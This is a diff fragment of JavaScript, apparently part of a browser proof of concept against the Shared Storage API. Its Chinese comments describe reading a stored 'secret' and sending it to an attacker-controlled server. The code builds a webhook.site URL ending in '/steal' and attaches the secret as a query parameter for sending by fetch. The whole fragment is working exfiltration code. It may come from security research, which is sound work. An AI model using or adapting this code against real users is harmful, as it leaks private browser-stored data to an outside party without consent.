@@ -9,7 +9,7 @@
     (async () => {
       try {
         // 尝试从 Shared Storage 读取消息
-        const secret = await WorkletSharedStorage.get("message");
+        const secret = await this.sharedStorage.get("message");
         // 将 secret 通过 fetch 发送到攻击者控制的服务器
         const url = new URL("https://webhook.site/a39336da-a963-4109-8cbe-575040541868/steal");
         url.searchParams.append("secret", secret);
